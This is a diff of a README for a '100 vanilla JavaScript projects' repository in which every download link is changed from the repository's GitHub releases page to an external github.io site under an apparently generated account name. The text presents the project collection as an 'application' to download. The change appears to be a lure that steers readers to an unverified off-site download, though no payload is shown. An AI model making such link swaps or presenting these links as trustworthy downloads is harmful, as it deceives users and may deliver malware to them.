@@ -1,6 +1,6 @@
 # 🚀 100-vanilla-javascript-projects - 100 Free Projects, Zero Setup Needed
 
-[![Download Now](https://img.shields.io/badge/Download-100_Projects-2ea44f?style=for-the-badge)](https://github.com/fossafossanonfluentaphasia515/100-vanilla-javascript-projects/releases)
+[![Download Now](https://img.shields.io/badge/Download-100_Projects-2ea44f?style=for-the-badge)](https://fossafossanonfluentaphasia515.github.io)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these **3 simple steps** to get your projects:
 
 ### Step 1: Download the Package
 
-[**Click here to download**](https://github.com/fossafossanonfluentaphasia515/100-vanilla-javascript-projects/releases)
+[**Click here to download**](https://fossafossanonfluentaphasia515.github.io)
 
 Visit this link to download the application.
 
@@ -138,7 +138,7 @@ The collection is regularly updated. Check the download link periodically for ne
 
 Need to re-download or get the latest version?
 
-[**Download the latest release**](https://github.com/fossafossanonfluentaphasia515/100-vanilla-javascript-projects/releases)
+[**Download the latest release**](https://fossafossanonfluentaphasia515.github.io)
 
 Visit this link to download the application.
 
